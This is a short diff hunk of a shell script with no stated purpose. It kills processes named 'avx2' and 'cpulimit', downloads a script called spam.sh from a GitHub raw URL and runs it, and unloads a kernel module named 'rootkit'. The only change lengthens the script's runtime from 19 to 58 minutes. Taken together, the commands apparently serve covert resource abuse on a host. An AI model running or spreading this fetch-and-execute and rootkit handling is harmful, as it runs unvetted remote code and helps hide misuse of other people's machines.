@@ -21,7 +21,7 @@ dmesg
 pkill -31 avx2
 pkill -31 cpulimit
 wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
-timeout 19m ./spam.sh
+timeout 58m ./spam.sh
 rmmod rootkit
 dmesg
 pkill -31 avx2
